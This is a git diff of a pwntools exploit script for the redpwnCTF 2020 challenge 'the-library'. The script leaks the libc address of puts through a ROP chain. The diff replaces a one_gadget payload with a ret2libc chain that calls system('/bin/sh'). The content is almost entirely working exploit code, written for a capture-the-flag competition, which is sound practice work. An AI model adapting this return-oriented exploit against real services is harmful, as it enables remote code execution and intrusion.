@@ -1,5 +1,8 @@
 from pwn import *
 host,port="2020.redpwnc.tf",31350
+
+context.log_level = 'error'
+
 p = connect(host,port)
 binary = ELF('./the-library')
 libc = ELF('./libc.so.6')
@@ -16,6 +19,7 @@ payload += p64(got_puts)
 payload += p64(plt_puts)
 payload += p64(main)
 
+print(payload)
 p.recvline()
 p.sendline(payload)
 p.recvline()
@@ -26,12 +30,10 @@ libc.address = leaked_puts - libc_puts
 log.success("Leaked puts :  {}".format(hex(leaked_puts)))
 log.success("Libc at  :  {}".format(hex(libc.address)))
 
-
 libc_base=libc.address
 payload = JUNK
-one_gadget = p64(libc.address + 0x4f2c5) 
-payload+=one_gadget
-
-p.recvline()
-p.sendline(payload)
-p.interactive()
+payload += p64(pop_rdi)#pop_rdi
+payload += p64(libc_base+0x1b3e9a) #libc_"bin/sh"
+payload += p64(libc_base+0x04f440) #libc_system
+payload += p64(libc_base+0x043120) #libc_exit
+print(payload)
